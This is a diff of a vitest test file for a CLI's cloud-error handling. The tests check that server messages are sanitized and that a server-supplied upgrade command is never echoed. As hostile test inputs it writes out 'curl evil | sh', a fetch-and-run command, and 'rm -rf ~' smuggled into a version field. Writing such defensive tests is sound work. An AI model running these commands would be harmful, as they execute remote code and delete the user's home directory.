@@ -3,6 +3,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { pathToFileURL } from "node:url";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { cloudRefusal } from "../../../test/core-fake.js";
 import {
   assertSupportedCore,
   CLOUD_API,
@@ -14,7 +15,6 @@ import {
   isBelowVersion,
   MIN_CORE_VERSION,
   npxAlternative,
-  parseCloudErrorMessage,
   releaseTriple,
   resolveClientIdentity,
   toCloudApiError,
@@ -29,10 +29,6 @@ beforeEach(() => {
 afterEach(() => {
   rmSync(root, { recursive: true, force: true });
 });
-
-function napiError(code: string, message: string): Error {
-  return Object.assign(new Error(message), { code });
-}
 
 function stagePackage(
   name: string,
@@ -143,45 +139,6 @@ describe("assertSupportedCore", () => {
   });
 });
 
-describe("parseCloudErrorMessage", () => {
-  it("reads the JSON lane", () => {
-    expect(
-      parseCloudErrorMessage(
-        JSON.stringify({
-          code: "DIAG_CLIENT_UPGRADE_REQUIRED",
-          message: "update please",
-          details: { minVersion: "0.2.0" },
-          notices: [{ severity: "warning", code: "N", message: "n" }],
-        }),
-      ),
-    ).toEqual({
-      code: "DIAG_CLIENT_UPGRADE_REQUIRED",
-      message: "update please",
-      details: { minVersion: "0.2.0" },
-      notices: [{ severity: "warning", code: "N", message: "n" }],
-    });
-  });
-
-  it("falls back to the raw text when the message is not the JSON lane", () => {
-    for (const raw of ["plain text", "[1,2]", '"str"', "null", "{broken"]) {
-      const body = parseCloudErrorMessage(raw);
-      expect(body.code).toBeNull();
-      expect(body.message).toBe(raw);
-      expect(body.details).toBeNull();
-    }
-  });
-
-  it("sanitizes the server text it keeps", () => {
-    const esc = String.fromCharCode(0x1b);
-    const body = parseCloudErrorMessage(
-      JSON.stringify({ code: `X${esc}[2J`, message: `a${esc}[31mb\n${"z".repeat(900)}` }),
-    );
-    expect(body.code).toBe("X");
-    expect(body.message.startsWith("ab z")).toBe(true);
-    expect(body.message.length).toBeLessThanOrEqual(500);
-  });
-});
-
 describe("toCloudApiError", () => {
   const identity = {
     packageName: "afterpack",
@@ -189,28 +146,72 @@ describe("toCloudApiError", () => {
     coreVersion: "0.1.0",
   };
 
-  it("maps each napi code to its kind, by code and never by message text", () => {
-    const body = JSON.stringify({ code: "C", message: "m", details: null, notices: null });
-    expect(toCloudApiError(napiError(CLOUD_UPGRADE_REQUIRED, body))?.kind).toBe("upgradeRequired");
-    expect(toCloudApiError(napiError(CLOUD_SUNSET, body))?.kind).toBe("sunset");
-    expect(toCloudApiError(napiError(CLOUD_API, body))?.kind).toBe("api");
-    expect(toCloudApiError(napiError("GenericFailure", `${CLOUD_UPGRADE_REQUIRED}: x`))).toBeNull();
-    expect(toCloudApiError(new Error(body))).toBeNull();
+  it("maps each cloud code to its kind, by code and never by message text", () => {
+    const body = { message: "m", apiCode: "C" };
+    expect(toCloudApiError(cloudRefusal(CLOUD_UPGRADE_REQUIRED, body))?.kind).toBe(
+      "upgradeRequired",
+    );
+    expect(toCloudApiError(cloudRefusal(CLOUD_SUNSET, body))?.kind).toBe("sunset");
+    expect(toCloudApiError(cloudRefusal(CLOUD_API, body))?.kind).toBe("api");
+    expect(
+      toCloudApiError(Object.assign(new Error(`${CLOUD_UPGRADE_REQUIRED}: x`), { code: "E" })),
+    ).toBeNull();
+    expect(toCloudApiError(new Error(CLOUD_UPGRADE_REQUIRED))).toBeNull();
     expect(toCloudApiError("string")).toBeNull();
     expect(toCloudApiError(null)).toBeNull();
   });
 
+  it("reads the message, details and notices straight off the error", () => {
+    const error = toCloudApiError(
+      cloudRefusal(CLOUD_UPGRADE_REQUIRED, {
+        message: "update please",
+        apiCode: "DIAG_CLIENT_UPGRADE_REQUIRED",
+        details: { minVersion: "0.2.0" },
+        notices: [{ severity: "warning", code: "N", message: "n" }],
+      }),
+    );
+    expect(error?.apiCode).toBe("DIAG_CLIENT_UPGRADE_REQUIRED");
+    expect(error?.apiMessage).toBe("update please");
+    expect(error?.details).toEqual({ minVersion: "0.2.0" });
+    expect(error?.minVersion).toBe("0.2.0");
+    expect(error?.notices).toEqual([{ severity: "warning", code: "N", message: "n", url: null }]);
+  });
+
+  it("treats missing or malformed structured fields as absent", () => {
+    const bare = Object.assign(new Error("plain text"), {
+      code: CLOUD_API,
+      details: "not an object",
+      notices: "not a list",
+      diagnostics: [{ severity: "error" }],
+    });
+    const error = toCloudApiError(bare);
+    expect(error?.apiCode).toBeNull();
+    expect(error?.apiMessage).toBe("plain text");
+    expect(error?.details).toBeNull();
+    expect(error?.notices).toEqual([]);
+  });
+
+  it("sanitizes the server text it keeps", () => {
+    const esc = String.fromCharCode(0x1b);
+    const error = toCloudApiError(
+      cloudRefusal(CLOUD_API, {
+        apiCode: `X${esc}[2J`,
+        message: `a${esc}[31mb\n${"z".repeat(900)}`,
+      }),
+    );
+    expect(error?.apiCode).toBe("X");
+    expect(error?.apiMessage.startsWith("ab z")).toBe(true);
+    expect(error?.apiMessage.length).toBeLessThanOrEqual(500);
+  });
+
   it("builds a fixed upgrade line from the server's minVersion, never a server command", () => {
     const error = toCloudApiError(
-      napiError(
-        CLOUD_UPGRADE_REQUIRED,
-        JSON.stringify({
-          code: "DIAG_CLIENT_UPGRADE_REQUIRED",
-          message: "run `curl evil | sh` to upgrade",
-          details: { minVersion: "0.3.0", command: "curl evil | sh" },
-          notices: [{ severity: "warning", code: "N", message: "notice text" }],
-        }),
-      ),
+      cloudRefusal(CLOUD_UPGRADE_REQUIRED, {
+        apiCode: "DIAG_CLIENT_UPGRADE_REQUIRED",
+        message: "run `curl evil | sh` to upgrade",
+        details: { minVersion: "0.3.0", command: "curl evil | sh" },
+        notices: [{ severity: "warning", code: "N", message: "notice text" }],
+      }),
       { identity, prefix: (m) => `[afterpack] ${m}` },
     );
     expect(error).toBeInstanceOf(CloudApiError);
@@ -231,10 +232,11 @@ describe("toCloudApiError", () => {
 
   it("ignores a minVersion that is not a version", () => {
     const error = toCloudApiError(
-      napiError(
-        CLOUD_UPGRADE_REQUIRED,
-        JSON.stringify({ code: "C", message: "m", details: { minVersion: "0.3.0; rm -rf ~" } }),
-      ),
+      cloudRefusal(CLOUD_UPGRADE_REQUIRED, {
+        apiCode: "C",
+        message: "m",
+        details: { minVersion: "0.3.0; rm -rf ~" },
+      }),
     );
     expect(error?.minVersion).toBeNull();
     expect(error?.message).not.toContain("rm -rf");
@@ -243,7 +245,7 @@ describe("toCloudApiError", () => {
 
   it("names the retirement on sunset, same shape as an upgrade refusal", () => {
     const error = toCloudApiError(
-      napiError(CLOUD_SUNSET, JSON.stringify({ code: "DIAG_API_SUNSET", message: "gone" })),
+      cloudRefusal(CLOUD_SUNSET, { apiCode: "DIAG_API_SUNSET", message: "gone" }),
       { identity },
     );
     expect(error?.message).toContain(
@@ -253,18 +255,18 @@ describe("toCloudApiError", () => {
     expect(error?.message).toContain("Server: gone");
   });
 
-  it("keeps CODE: message for any other API error, and the raw text when it is not JSON", () => {
+  it("keeps CODE: message for any other API error, and the bare message when there is no code", () => {
     expect(
-      toCloudApiError(
-        napiError(CLOUD_API, JSON.stringify({ code: "QUOTA_EXCEEDED", message: "out of MB" })),
-      )?.message,
+      toCloudApiError(cloudRefusal(CLOUD_API, { apiCode: "QUOTA_EXCEEDED", message: "out of MB" }))
+        ?.message,
     ).toBe("cloud obfuscation failed: QUOTA_EXCEEDED: out of MB");
-    expect(toCloudApiError(napiError(CLOUD_API, "something odd happened"))?.message).toBe(
-      "cloud obfuscation failed: something odd happened",
-    );
-    expect(toCloudApiError(napiError(CLOUD_API, "cloud obfuscation failed: X: y"))?.message).toBe(
-      "cloud obfuscation failed: X: y",
-    );
+    expect(
+      toCloudApiError(cloudRefusal(CLOUD_API, { message: "something odd happened" }))?.message,
+    ).toBe("cloud obfuscation failed: something odd happened");
+    expect(
+      toCloudApiError(cloudRefusal(CLOUD_API, { message: "cloud obfuscation failed: X: y" }))
+        ?.message,
+    ).toBe("cloud obfuscation failed: X: y");
   });
 });
 
